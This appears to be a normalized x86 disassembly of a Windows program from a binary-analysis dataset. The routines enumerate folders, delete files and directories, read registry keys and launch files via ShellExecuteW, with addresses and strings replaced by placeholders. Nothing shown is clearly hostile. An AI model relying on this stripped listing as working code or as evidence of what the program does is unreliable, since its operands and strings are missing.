mov esi ecx
push ecx
lea ecx [ ebp - 0x4 ]
call j_sub_40b224
add esi 0x50
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_40def1
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_40df04
push eax
lea ecx [ ebp - 0x4 ]
call sub_40df52
test al al
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_40df18
mov ecx eax
call j_sub_402624
mov ecx eax
call sub_40e7b8
lea ecx [ ebp - 0x4 ]
call sub_40df24
mov ecx r--data
call sub_40e7b8
mov ecx r--data
call sub_40e7b8
mov ecx r--data
call sub_40e7b8
mov ecx r--data
call sub_40e7b8
pop esi
leave
retn
sub_40c85f
push 0xffffffff
push sub_41e140
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push r--data
lea ecx [ esp + 0x30 ]
call sub_402193
lea eax [ esi + 0x20 ]
xor ebx ebx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] ebx
call sub_402127
lea ecx [ esp + 0x14 ]
mov [ esp + 0x68 ] 0x1
call sub_40228d
dec eax
push eax
lea ecx [ esp + 0x18 ]
call sub_40dd9e
cmp [ eax ] 0x5c
je r-xdata
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_4023f3
push r--data
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x48 ]
call sub_402e04
pop ecx
mov ebp r--data
push ebp
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] 0x2
call sub_402403
lea ecx [ esp + 0x44 ]
call j_sub_402624
mov esi [ PathFileExistsW@IAT ]
push eax
call esi
lea ecx [ esp + 0x14 ]
mov edi eax
call j_sub_402624
push eax
call esi
mov esi eax
call sub_40dba9
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x18 ]
call sub_402403
test esi esi
je r-xdata
test edi edi
je r-xdata
lea ecx [ esp + 0x44 ]
call sub_40223f
lea ecx [ esp + 0x14 ]
call sub_40223f
lea ecx [ esp + 0x2c ]
call sub_40223f
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_40eb9e
add esp 0x58
retn
push ebp
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x34 ]
call sub_4023f3
mov ecx eax
call sub_402403
push ebx
push ebx
lea ecx [ esp + 0x34 ]
call j_sub_402624
push eax
push r--data
push ebx
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ esp + 0x14 ]
lea eax [ esp + 0x44 ]
push eax
lea ecx [ esp + 0x30 ]
call sub_4023f3
push ebx
push ebx
lea ecx [ esp + 0x34 ]
call j_sub_402624
push eax
push r--data
push ebx
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ esp + 0x44 ]
jmp r-xdata
call sub_40d981
sub_40c9e8
push 0x1c
mov eax sub_41e10d
call sub_411378
mov esi rw-data
push [ esi ]
lea ecx [ ebp - 0x28 ]
call sub_402193
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40d6ca
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40223f
add esi 0x4
cmp esi rw-data
jl r-xdata
call sub_411346
retn
sub_40ca2c
push 0xffffffff
push sub_41e253
mov eax [ fs : 0x0 ]
push eax
sub esp 0xae4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xae0 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xaf8 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea eax [ esp + 0x8ec ]
push eax
xor ebp ebp
push ebp
push ebp
push 0x17
push ebp
call [ SHGetFolderPathW@IAT ]
xor eax eax
push 0x206
mov [ esp + 0x4e0 ] ax
lea eax [ esp + 0x4e2 ]
push ebp
push eax
call sub_414c70
add esp 0xc
lea eax [ esp + 0x4dc ]
push 0x104
push eax
call [ GetSystemDirectoryW@IAT ]
push ecx
lea ecx [ esp + 0x1c ]
call j_sub_40b224
lea eax [ esp + 0x18 ]
push eax
lea ecx [ ebx + 0x5c ]
call sub_40def1
lea eax [ esp + 0x1c ]
push eax
lea ecx [ ebx + 0x5c ]
call sub_40df04
push eax
lea ecx [ esp + 0x1c ]
call sub_40df52
mov edi [ PathFileExistsW@IAT ]
test al al
je r-xdata
lea ebp [ ebx + 0x20 ]
mov ecx ebp
call j_sub_402624
push eax
call edi
test eax eax
je r-xdata
mov esi [ lstrlenW@IAT ]
xor eax eax
mov esi 0x206
push esi
mov [ esp + 0x2d8 ] ax
xor ebp ebp
lea eax [ esp + 0x2da ]
push ebp
push eax
call sub_414c70
add esp 0xc
xor eax eax
push esi
mov [ esp + 0x6e8 ] ax
lea eax [ esp + 0x6ea ]
push ebp
push eax
call sub_414c70
add esp 0xc
lea eax [ esp + 0x6e4 ]
push eax
push ebp
push ebp
push 0x1a
push ebp
call [ SHGetFolderPathW@IAT ]
mov esi [ PathCombineW@IAT ]
test eax eax
js r-xdata
lea ecx [ esp + 0x6c ]
call sub_402150
push r--data
mov edx ebp
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb04 ] 0x1
call sub_402e04
pop ecx
lea ecx [ esp + 0x84 ]
push ecx
mov ecx eax
call j_sub_402624
mov esi [ FindFirstFileW@IAT ]
push eax
call esi
lea ecx [ esp + 0x20 ]
call sub_40223f
push r--data
mov edx ebp
lea ecx [ esp + 0x24 ]
call sub_402e04
pop ecx
lea ecx [ esp + 0x84 ]
push ecx
mov ecx eax
call j_sub_402624
push eax
call esi
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_40223f
jmp r-xdata
push ecx
push r--data
lea ecx [ esp + 0x74 ]
call sub_40229a
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
lea ecx [ ebx + 0x20 ]
call j_sub_402624
push eax
push r--data
call esi
push eax
push ebp
lea ecx [ esp + 0x78 ]
call sub_40dd7a
push 0x208
lea eax [ esp + 0x2d8 ]
push ebp
push eax
call sub_414c70
add esp 0xc
lea ecx [ ebx + 0x8 ]
call j_sub_402624
push eax
lea eax [ esp + 0x8f0 ]
push eax
lea eax [ esp + 0x2dc ]
push eax
call esi
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x6e8 ]
push eax
lea eax [ esp + 0x2dc ]
push eax
call esi
lea eax [ esp + 0x2d4 ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x84 ]
push eax
push esi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push ecx
push r--data
lea ecx [ esp + 0x74 ]
call sub_40229a
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
lea eax [ esp + 0x8ec ]
push eax
push r--data
call esi
push eax
push ebp
lea ecx [ esp + 0x78 ]
call sub_40dd7a
mov ecx [ esp + 0xaf8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0xae0 ]
xor ecx esp
call sub_40eb9e
add esp 0xaf0
retn
lea eax [ esp + 0x2d4 ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x2d4 ]
push eax
lea ecx [ esp + 0x70 ]
call sub_402193
lea ecx [ esp + 0x6c ]
mov [ esp + 0xb00 ] 0x3
call sub_40d737
or [ esp + 0xb00 ] 0xffffffff
lea ecx [ esp + 0x6c ]
call sub_40223f
cmp [ esp + 0xb0 ] 0x2e
je r-xdata
push esi
call [ FindClose@IAT ]
or [ esp + 0xb00 ] 0xffffffff
lea ecx [ esp + 0x6c ]
call sub_40223f
push ecx
push r--data
lea ecx [ esp + 0x74 ]
call sub_40229a
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
lea ecx [ ebx + 0x8 ]
push ecx
push r--data
call esi
push eax
push ebp
lea ecx [ esp + 0x78 ]
call sub_40dd62
lea eax [ esp + 0x2d4 ]
push eax
lea ecx [ esp + 0x24 ]
call sub_402193
lea ecx [ esp + 0x20 ]
mov [ esp + 0xb00 ] 0x4
call sub_40d737
lea ecx [ esp + 0x20 ]
call sub_40223f
push r--data
mov edx ebp
lea ecx [ esp + 0x58 ]
call sub_402e04
pop ecx
lea ecx [ esp + 0xb0 ]
push ecx
mov edx eax
lea ecx [ esp + 0x40 ]
mov [ esp + 0xb04 ] 0x2
call sub_409abe
pop ecx
push eax
lea ecx [ esp + 0x70 ]
call sub_4021e3
lea ecx [ esp + 0x3c ]
call sub_40223f
lea ecx [ esp + 0x54 ]
mov [ esp + 0xb00 ] 0x1
call sub_40223f
test [ esp + 0x84 ] 0x10
lea ecx [ esp + 0x6c ]
je r-xdata
lea ecx [ esp + 0x6c ]
call j_sub_402624
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x4dc ]
push eax
push r--data
call esi
push eax
push ebp
lea ecx [ esp + 0x78 ]
call sub_40dd7a
call sub_40d981
call sub_40d737
jmp r-xdata
or [ esp + 0xb00 ] 0xffffffff
lea ecx [ esp + 0x6c ]
call sub_40223f
push ecx
lea eax [ esp + 0x3c ]
push eax
lea ecx [ esp + 0x20 ]
call sub_40df30
lea eax [ esp + 0x1c ]
push eax
lea ecx [ ebx + 0x5c ]
call sub_40df04
push eax
lea ecx [ esp + 0x1c ]
call sub_40df52
test al al
jne r-xdata
lea ecx [ esp + 0x6c ]
call j_sub_402624
push eax
call [ PathIsDirectoryW@IAT ]
lea ecx [ esp + 0x6c ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
call sub_40df18
mov ecx eax
call j_sub_402624
push eax
lea ecx [ esp + 0x70 ]
call sub_402193
and [ esp + 0xb00 ] 0x0
push ecx
push r--data
lea ecx [ esp + 0x74 ]
call sub_40229a
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
call sub_40d981
call sub_40d737
jmp r-xdata
sub_40cec5
push 0x49c
mov eax sub_41e306
call sub_4113ab
mov esi ecx
lea eax [ esi + 0x20 ]
push eax
lea ecx [ ebp - 0x484 ]
call sub_402127
xor ebx ebx
lea ecx [ ebp - 0x454 ]
mov [ ebp - 0x4 ] ebx
call sub_402150
xor eax eax
mov edi 0x206
mov [ ebp - 0x4 ] 0x1
push edi
mov [ ebp - 0x21c ] ax
lea eax [ ebp - 0x21a ]
push ebx
push eax
call sub_414c70
add esp 0xc
xor eax eax
push edi
mov [ ebp - 0x424 ] ax
lea eax [ ebp - 0x422 ]
push ebx
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x424 ]
push eax
push ebx
push ebx
push 0x1a
push ebx
call [ SHGetFolderPathW@IAT ]
test eax eax
js r-xdata
push ecx
lea ecx [ ebp - 0x4a0 ]
call j_sub_40b224
lea eax [ ebp - 0x4a0 ]
lea edi [ esi + 0x68 ]
push eax
mov ecx edi
call sub_40def1
lea eax [ ebp - 0x4a4 ]
push eax
mov ecx edi
call sub_40df04
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40df52
test al al
je r-xdata
push r--data
lea eax [ ebp - 0x424 ]
push eax
lea eax [ ebp - 0x21c ]
push eax
call [ PathCombineW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x454 ]
call j_sub_402504
lea ecx [ ebp - 0x454 ]
call sub_40228d
dec eax
push eax
lea ecx [ ebp - 0x454 ]
call sub_40dd9e
cmp [ eax ] 0x5c
jne r-xdata
lea ecx [ ebp - 0x454 ]
call sub_40223f
lea ecx [ ebp - 0x484 ]
call sub_40223f
call sub_41135a
retn
mov ebx [ lstrlenW@IAT ]
lea ecx [ ebp - 0x454 ]
call sub_40ddba
lea ecx [ ebp - 0x454 ]
call sub_402291
test al al
jne r-xdata
lea ecx [ ebp - 0x484 ]
call j_sub_402624
push eax
push r--data
call ebx
push eax
push esi
lea ecx [ ebp - 0x43c ]
call sub_40dd7a
push ecx
push r--data
lea ecx [ ebp - 0x43c ]
call sub_40229a
mov esi eax
lea ecx [ ebp - 0x43c ]
cmp esi 0xffffffff
je r-xdata
push ecx
push r--data
lea ecx [ ebp - 0x43c ]
call sub_40229a
mov esi eax
cmp esi 0xffffffff
je r-xdata
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push esi
push 0x0
lea eax [ ebp - 0x46c ]
push eax
call sub_40ddf9
push 0xffffffff
lea eax [ esi + 0x1 ]
push eax
lea eax [ ebp - 0x49c ]
push eax
lea ecx [ ebp - 0x43c ]
mov [ ebp - 0x4 ] 0x3
call sub_40ddf9
lea edx [ ebp - 0x49c ]
lea ecx [ ebp - 0x46c ]
mov [ ebp - 0x4 ] 0x4
call sub_40d9ec
lea ecx [ ebp - 0x49c ]
call sub_40223f
lea ecx [ ebp - 0x46c ]
call sub_40223f
jmp r-xdata
lea eax [ ebp - 0x21c ]
push eax
push r--data
call ebx
push eax
push esi
lea ecx [ ebp - 0x43c ]
call sub_40dd7a
lea ecx [ ebp - 0x43c ]
mov [ ebp - 0x4 ] 0x1
call sub_40223f
push ecx
lea eax [ ebp - 0x4a8 ]
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40df30
lea eax [ ebp - 0x4a4 ]
push eax
mov ecx edi
call sub_40df04
push eax
lea ecx [ ebp - 0x4a0 ]
call sub_40df52
test al al
jne r-xdata
lea ecx [ ebp - 0x43c ]
call sub_40d981
lea ecx [ ebp - 0x4a0 ]
call sub_40df18
mov ecx eax
call j_sub_402624
push eax
lea ecx [ ebp - 0x43c ]
call sub_402193
push ecx
push r--data
lea ecx [ ebp - 0x43c ]
mov [ ebp - 0x4 ] 0x2
call sub_40229a
mov esi eax
cmp esi 0xffffffff
je r-xdata
sub_40d16e
push 0xffffffff
push sub_41e3ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x234
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x230 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x248 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor eax eax
push 0x206
mov [ esp + 0x40 ] ax
xor ebx ebx
lea eax [ esp + 0x42 ]
push ebx
push eax
call sub_414c70
add esp 0xc
lea eax [ esp + 0x3c ]
push eax
push ebx
push ebx
push 0x10
push ebx
call [ SHGetFolderPathW@IAT ]
test eax eax
js r-xdata
mov ecx [ esp + 0x248 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x230 ]
xor ecx esp
call sub_40eb9e
add esp 0x240
retn
push ecx
lea ecx [ esp + 0x1c ]
call j_sub_40b224
lea eax [ esp + 0x18 ]
add esi 0x74
push eax
mov ecx esi
call sub_40def1
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_40df04
push eax
lea ecx [ esp + 0x1c ]
call sub_40df52
test al al
je r-xdata
mov ebp r--data
lea ecx [ esp + 0x24 ]
call sub_402291
test al al
jne r-xdata
lea eax [ esp + 0x3c ]
push eax
push ebp
call [ lstrlenW@IAT ]
push eax
push edi
lea ecx [ esp + 0x30 ]
call sub_40dd7a
or [ esp + 0x250 ] 0xffffffff
lea ecx [ esp + 0x24 ]
call sub_40223f
push ecx
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_40df30
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_40df04
push eax
lea ecx [ esp + 0x1c ]
call sub_40df52
test al al
jne r-xdata
lea ecx [ esp + 0x24 ]
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
call sub_40df18
mov ecx eax
call j_sub_402624
push eax
lea ecx [ esp + 0x28 ]
call sub_402193
push ecx
push ebp
lea ecx [ esp + 0x2c ]
mov [ esp + 0x258 ] ebx
call sub_40229a
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea ecx [ esp + 0x24 ]
call j_sub_402624
push eax
call [ DeleteFileW@IAT ]
sub_40d2fc
push 0x64
mov eax sub_41e346
call sub_4113ab
mov esi ecx
push r--data
lea ecx [ ebp - 0x70 ]
call sub_402193
xor ebx ebx
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] ebx
call sub_402193
add esi 0x8
push esi
mov edx r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x1
call sub_40e1b8
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x58 ]
mov [ esp ] r--data
call sub_402193
push ebx
lea ecx [ ebp - 0x40 ]
call j_sub_402624
mov edi 0x80000002
mov edx eax
mov ecx edi
call sub_40b4ad
pop ecx
push ebx
lea ecx [ ebp - 0x70 ]
call j_sub_402624
mov edx eax
mov ecx edi
call sub_40b4ad
pop ecx
push ebx
lea ecx [ ebp - 0x28 ]
call j_sub_402624
mov edx eax
mov ecx edi
call sub_40b4ad
pop ecx
mov ecx esi
call j_sub_402624
push eax
lea ecx [ ebp - 0x58 ]
call j_sub_402624
mov edx eax
lea ecx [ edi - 0x1 ]
call sub_40b4ad
pop ecx
lea ecx [ ebp - 0x58 ]
call sub_40223f
lea ecx [ ebp - 0x28 ]
call sub_40223f
lea ecx [ ebp - 0x40 ]
call sub_40223f
lea ecx [ ebp - 0x70 ]
call sub_40223f
call sub_41135a
retn
sub_40d3d0
push 0xffffffff
push sub_41e1ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x9c ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
mov ebp [ esp + 0xac ]
xor ebx ebx
mov [ esp + 0xa4 ] ebx
or [ ebp ] 0xffffffff
mov ecx edi
call sub_40dd5a
push ecx
lea ecx [ esp + 0x30 ]
call sub_40b536
sub esp 0xc
lea ecx [ esp + 0x38 ]
call sub_40e885
push esi
mov edx r--data
lea ecx [ esp + 0x68 ]
mov [ esp + 0xa8 ] 0x1
call sub_40e1b8
mov [ esp + 0xa8 ] 0x2
lea ecx [ esp + 0x68 ]
mov [ esp ] 0x20019
call j_sub_402624
push eax
push 0x80000000
lea ecx [ esp + 0x38 ]
call sub_40e8ab
test al al
je r-xdata
lea ecx [ esp + 0x64 ]
call sub_40223f
lea ecx [ esp + 0x2c ]
call j_sub_40e891
lea ecx [ esp + 0xb0 ]
call sub_40223f
mov al bl
mov ecx [ esp + 0x9c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_40eb9e
add esp 0x94
retn
lea eax [ esp + 0xb0 ]
push eax
push ebx
lea ecx [ esp + 0x34 ]
call sub_40e904
test al al
je r-xdata
mov ecx rw-data
call sub_40228d
push eax
push ecx
lea ecx [ esp + 0xb8 ]
push ecx
push eax
push ecx
call sub_40de18
test eax eax
jne r-xdata
lea ecx [ esp + 0x2c ]
call sub_40e891
push r--data
lea ecx [ esp + 0x18 ]
call sub_402193
mov esi eax
push r--data
lea edx [ esp + 0xb4 ]
lea ecx [ esp + 0x50 ]
mov [ esp + 0xa8 ] 0x3
call sub_402e04
push esi
mov edx eax
lea ecx [ esp + 0x84 ]
mov [ esp + 0xac ] 0x4
call sub_409b44
pop ecx
pop ecx
lea ecx [ esp + 0x4c ]
call sub_40223f
lea ecx [ esp + 0x14 ]
mov [ esp + 0xa4 ] 0x7
call sub_40223f
push 0x20019
lea ecx [ esp + 0x80 ]
call j_sub_402624
push eax
push 0x80000000
lea ecx [ esp + 0x38 ]
call sub_40e8ab
test al al
je r-xdata
lea ecx [ esp + 0x7c ]
call sub_40223f
lea ecx [ esp + 0x34 ]
call sub_402150
lea eax [ esp + 0x34 ]
push eax
push ebx
lea ecx [ esp + 0x34 ]
mov [ esp + 0xac ] 0x8
call sub_40e904
test al al
je r-xdata
lea ecx [ esp + 0x34 ]
mov bl 0x1
call sub_40223f
push ecx
push ecx
lea ecx [ esp + 0x3c ]
call sub_40ddc5
mov esi eax
lea eax [ esp + 0x34 ]
push eax
mov ecx edi
call sub_402249
cmp esi 0xffffffff
je r-xdata
push 0xffffffff
lea eax [ esi + 0x1 ]
push eax
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x40 ]
call sub_40ddf9
lea ecx [ esp + 0x4c ]
mov [ esp + 0xa4 ] 0x9
call j_sub_402624
push eax
call sub_40f656
pop ecx
push esi
mov [ ebp ] eax
push ebx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x40 ]
call sub_40ddf9
push eax
mov ecx edi
call sub_4021e3
lea ecx [ esp + 0x14 ]
call sub_40223f
lea ecx [ esp + 0x4c ]
call sub_40223f
sub_40d64b
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ecx
mov edx r--data
lea ecx [ ebp - 0x1c ]
call sub_40e1b8
pop ecx
lea ecx [ ebp - 0x1c ]
call j_sub_402624
push eax
call sub_40b4d0
pop ecx
lea ecx [ ebp - 0x1c ]
call sub_40223f
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40eb9e
leave
retn
sub_40d68d
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ecx
lea ecx [ ebp - 0x1c ]
call sub_40e214
pop ecx
lea ecx [ ebp - 0x1c ]
call j_sub_402624
push eax
call sub_40b4d0
pop ecx
lea ecx [ ebp - 0x1c ]
call sub_40223f
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40eb9e
leave
retn
sub_40d6ca
push 0x3c
mov eax sub_41e37b
call sub_4113ab
mov esi ecx
lea ecx [ ebp - 0x44 ]
call sub_402150
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_402150
sub esp 0x18
lea eax [ ebp - 0x44 ]
mov ecx esp
push eax
mov [ ebp - 0x4 ] 0x1
call sub_402127
lea eax [ ebp - 0x48 ]
push eax
lea edx [ ebp - 0x2c ]
mov ecx esi
call sub_40d3d0
add esp 0x1c
test al al
je r-xdata
mov ecx esi
call sub_40d68d
lea ecx [ ebp - 0x2c ]
call sub_40223f
lea ecx [ ebp - 0x44 ]
call sub_40223f
call sub_41135a
retn
mov ecx esi
call sub_40d64b
sub_40d737
push 0x2cc
mov eax sub_41e1f4
call sub_4113ab
mov esi ecx
call j_sub_402624
push eax
call [ PathIsDirectoryW@IAT ]
test eax eax
jne r-xdata
mov ecx esi
call sub_402291
test al al
jne r-xdata
xor al al
jmp r-xdata
push esi
lea ecx [ ebp - 0x28 ]
call sub_402127
xor ebx ebx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] ebx
call sub_40228d
dec eax
push eax
lea ecx [ ebp - 0x28 ]
call sub_40dd9e
cmp [ eax ] 0x5c
jne r-xdata
call sub_41135a
retn
lea ecx [ ebp - 0x28 ]
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40ddba
lea ecx [ ebp - 0x28 ]
call sub_40223f
mov al bl
lea ecx [ ebp - 0x40 ]
call sub_402150
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x4 ] 0x1
call sub_402e04
pop ecx
lea ecx [ ebp - 0x290 ]
push ecx
mov ecx eax
call j_sub_402624
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
xor ebx ebx
cmp edi 0xffffffff
lea ecx [ ebp - 0x2a8 ]
setne bl
call sub_40223f
test ebx ebx
je r-xdata
push edi
call [ FindClose@IAT ]
mov ecx esi
call j_sub_402624
push eax
call [ RemoveDirectoryW@IAT ]
lea ebx [ eax - 0x1 ]
neg ebx
sbb bl bl
lea ecx [ ebp - 0x40 ]
inc bl
call sub_40223f
cmp [ ebp - 0x264 ] 0x2e
je r-xdata
lea eax [ ebp - 0x290 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x2c0 ]
call sub_402e04
pop ecx
lea ecx [ ebp - 0x264 ]
push ecx
mov edx eax
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0x2
call sub_409abe
pop ecx
push eax
lea ecx [ ebp - 0x40 ]
call sub_4021e3
lea ecx [ ebp - 0x2d8 ]
call sub_40223f
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x4 ] 0x1
call sub_40223f
test [ ebp - 0x290 ] 0x10
lea ecx [ ebp - 0x40 ]
je r-xdata
call sub_40d981
call sub_40d737
jmp r-xdata
sub_40d8bf
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
and [ ebp - 0x418 ] 0x0
push esi
push edi
mov esi ecx
mov edi rw-data
test al 0x1
jne r-xdata
mov ecx edi
call sub_402291
test al al
je r-xdata
or eax 0x1
mov ecx edi
mov [ rw-data ] eax
call sub_402150
push sub_41e802
call sub_40f3c3
pop ecx
push edi
mov ecx esi
call sub_402127
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
push 0x0
push r--data
lea eax [ ebp - 0x414 ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov ecx edi
call j_sub_402504
sub_40d981
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
mov ecx esi
call j_sub_402624
push eax
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x1c ]
call sub_40d8bf
push 0x3
lea ecx [ ebp - 0x1c ]
call j_sub_402624
push eax
mov ecx esi
call j_sub_402624
push eax
call [ MoveFileExW@IAT ]
lea ecx [ ebp - 0x1c ]
call sub_40223f
sub_40d9ec
push 0x2ec
mov eax sub_41e2a7
call sub_4113ab
mov [ ebp - 0x298 ] edx
mov esi ecx
call sub_402291
test al al
jne r-xdata
call sub_41135a
retn
push esi
lea ecx [ ebp - 0x2c ]
call sub_402127
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_40228d
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_40dd9e
cmp [ eax ] 0x5c
jne r-xdata
lea ecx [ ebp - 0x2c ]
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x2c ]
call sub_40ddba
lea ecx [ ebp - 0x2c ]
call sub_40223f
lea ecx [ ebp - 0x44 ]
call sub_402150
push r--data
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x2b0 ]
mov [ ebp - 0x4 ] 0x1
call sub_402e04
pop ecx
lea ecx [ ebp - 0x294 ]
push ecx
mov ecx eax
call j_sub_402624
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
xor ebx ebx
cmp edi 0xffffffff
lea ecx [ ebp - 0x2b0 ]
setne bl
call sub_40223f
test ebx ebx
je r-xdata
push edi
call [ FindClose@IAT ]
lea ecx [ ebp - 0x44 ]
call sub_40223f
mov ebx [ ebp - 0x298 ]
lea eax [ ebp - 0x294 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
test [ ebp - 0x294 ] 0x10
jne r-xdata
cmp [ ebp - 0x268 ] 0x2e
je r-xdata
lea eax [ ebp - 0x268 ]
push eax
call [ PathFindExtensionW@IAT ]
mov ecx ebx
mov esi eax
call j_sub_402624
push eax
push esi
call sub_4103f0
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x268 ]
push eax
lea ecx [ ebp - 0x2c8 ]
call sub_402193
mov esi eax
push r--data
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x2e0 ]
mov [ ebp - 0x4 ] 0x2
call sub_402e04
pop ecx
push esi
mov edx eax
lea ecx [ ebp - 0x2f8 ]
mov [ ebp - 0x4 ] 0x3
call sub_409b44
pop ecx
push eax
lea ecx [ ebp - 0x44 ]
call sub_4021e3
lea ecx [ ebp - 0x2f8 ]
call sub_40223f
lea ecx [ ebp - 0x2e0 ]
call sub_40223f
lea ecx [ ebp - 0x2c8 ]
mov [ ebp - 0x4 ] 0x1
call sub_40223f
lea ecx [ ebp - 0x44 ]
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_40d981
sub_40dba9
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push r--data
call [ GetModuleHandleW@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
